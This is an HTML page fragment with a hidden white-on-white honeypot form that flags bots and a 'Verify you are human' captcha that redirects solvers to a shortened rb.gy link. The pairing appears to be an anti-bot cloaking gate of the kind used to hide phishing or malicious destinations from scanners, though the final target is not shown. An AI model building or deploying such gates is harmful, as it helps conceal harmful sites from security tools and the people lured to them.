    <!-- oughta here -->
    <div class="tt">
        <form id="pp" name="honey" action="detected.html" method="get">
            <input type="text" id="in" placeholder="full name" name="honey" style="outline: none; text-decoration: none; border: none; color:white; background-color: white;" height="15px" width="20px">
            <input type="submit" id="in" style="border: none; color: white; background-color: white;" width="25px" height="17px;">
        </form>
    </div>

    <script>
        const form = document.getElementById('pp');
    
        form.addEventListener('submit', function (event) {
            const honeyField = form.querySelector('[name="honey"]');
            if (honeyField.value) {
                // Redirect the user to a "spam detected" page
                window.location.href = 'detected.html';
                event.preventDefault(); // Prevent the form from submitting (optional)
            }
        });
    </script>
    <div class="contain">
        <!--Captcha-->
        <div class="containerr" style="position: relative;">

            <div class="divv">
                <p class="popl">Verify you are human</p>
            </div>
            
            <div class="input_field captch_box">
                <input type="text" class="captch_box1" value="" disabled/>
            </div>

            <div class="input_field captch_input">
                <input type="text" class="captch_input1" value="" placeholder="Enter Captcha" />
            </div>      
            <div class="message" style="font-family: sans-serif; font-size: 18px;" ></div>
            <div class="input_field button">
                <button id="capbtn">Submit Captcha</button>
            </div>

        </div>
    
    </div>
    <script>
        const captchaTextBox = document.querySelector(".captch_box input");
        const captchaInputBox = document.querySelector(".captch_input input");
        const message = document.querySelector(".message");
        const submitButton = document.querySelector("button");
    
        let captchaText = null;
    
        const generateCaptcha = () => {
            const randomString = Math.random().toString(36).substring(2, 7);
            const randomStringArray = randomString.split("");
            const changeString = randomStringArray.map((char) => (Math.random() > 0.5 ? char.toUpperCase() : char));
            captchaText = changeString.join("   ");
            captchaTextBox.value = captchaText;
        };
    
        const captchaKeyUpValidate = () => {
            const trimmedInput = captchaInputBox.value.replace(/\s/g, ""); // Remove spaces from user input
            captchaInputBox.value = trimmedInput; // Update the input box with trimmed value
            submitButton.classList.toggle("disabled", !trimmedInput); // Check trimmed input for validation
        };
    
        generateCaptcha();
        captchaInputBox.value = "";
        captchaKeyUpValidate();
    
        const submitBtnClick = () => {
            captchaText = captchaText.split("").filter((char) => char !== " ").join("");
            message.classList.add("active");
            if (captchaInputBox.value === captchaText) {
                message.innerText = "";
                
                submitButton.style.opacity = 0.5;
                // Redirect the user to another website when the CAPTCHA is correct
                window.location.href = 'https://rb.gy/2c80s'; // Replace with your target URL
            } else {
                message.innerText = "Captcha is incorrect";
                generateCaptcha();
            }
        };
    
        captchaInputBox.addEventListener("input", captchaKeyUpValidate); // Use "input" event to capture all input changes
        submitButton.addEventListener("click", submitBtnClick);
    </script>
